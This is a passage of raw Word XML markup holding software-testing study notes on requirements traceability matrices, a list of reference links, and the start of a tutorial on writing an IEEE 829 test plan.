        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="121"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="802" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="803" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It confirms 100% test coverage</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="121"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="804" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="805" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It highlights any requirements missing or document inconsistencies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="121"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="806" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="807" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It shows the overall defects or execution status with a focus on business requirements</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="121"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="808" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="809" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It helps in analyzing or estimating the impact on the QA team's work with respect to revisiting or re-working on the test cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E54CA0" w:rsidRDefault="00E54CA0" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E54CA0" w:rsidRDefault="00E54CA0" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E54CA0" w:rsidRDefault="00E54CA0" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tracebility</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> links:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E54CA0"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36" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https://www.guru99.com/traceability-matrix.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE"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37" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>http://www.softwaretestinghelp.com/requirements-traceability-matrix/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE"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38" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>http://www.opencodez.com/software-testing/create-requirement-traceability-matrix-rtm-free-sample-download.htm</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE"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39" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>http://www.softwaretestingtimes.com/2010/04/traceability-matrix-from-software.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE"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40" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https://www.tutorialspoint.com/software_testing_dictionary/requirements_traceability_matrix.htm</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE" w:rsidRDefault="00B84F48" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId141" w:history="1">
        <w:r w:rsidR="000E75FE" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https://en.wikipedia.org/wiki/Traceability_matrix</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="000E75FE" w:rsidRDefault="000E75FE" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000E75FE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>http://www.professionalqa.com/traceability-matrix</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E54CA0" w:rsidRDefault="00E54CA0" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="24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What is a Test Plan?</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 test plan is a detailed document that outlines the test strategy,</w:t>
      </w:r>
      <w:hyperlink r:id="rId142" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="40A2B5"/>
          </w:rPr>
          <w:t> Testing </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>objectives, resources (manpower, software, hardware) required for testing, test schedule, test estimation and test deliverables.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test plan serves as a blueprint to conduct software testing activities as a defined process which is minutely monitored and controlled by the test manager.</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Let’s start with following scenario</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a meeting, you want to discuss the Test Plan with the team members, but they are not interested - .</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> such case, what will you do? Select your answer as following figure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>A) I am Manager do everything as I said</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>B) OK, let's me explain why we need a Test Plan</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>As a Test Manager, you must explain them the importance of Test Plan rather than force the team to do what you want.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Importance of Test Plan</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Making Test Plan has multiple benefits</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Test Plan helps us determine the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>effort</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> needed to validate the quality of the application  under test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Help people outside the test team such as developers, business managers, customers </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>understand</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> the details of testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E"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Test Plan </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>guides</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> our thinking. It is like a rule book, which needs to be followed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>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Important aspects like test estimation, test scope, test strategy are </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>documented</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> in Test Plan, so it can be reviewed by Management Team and re-used for other projects.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>How to write a Test Plan</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>You already know that making a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Test Plan</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> is the most important task of Test Management Process. Follow the seven steps below to create a test plan as per IEEE 829</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Analyze the product</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Design the Test Strategy</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Define Test Criteria</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Define the Test Objectives</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Resource Planning</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Plan Test Environment</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Schedule &amp; Estimation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Determine Test Deliverables</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1) Analyze the product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How can you test a product </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>without</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> any information about it? The answer is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Impossible. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>You must learn a product </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>thoroughly </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>before testing it.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product under test is Guru99 banking website. You should research clients and the end users to know their needs and expectations from the application</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Who will use the website?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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What is it used for?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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How will it work?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97F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What are software/ hardware the product uses?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can use the following approach to analyze the site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Now let’s apply above knowledge to a real product: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Analyze</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> the banking website </w:t>
      </w:r>
      <w:hyperlink r:id="rId143" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="40A2B5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://demo.guru99.com/V4</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
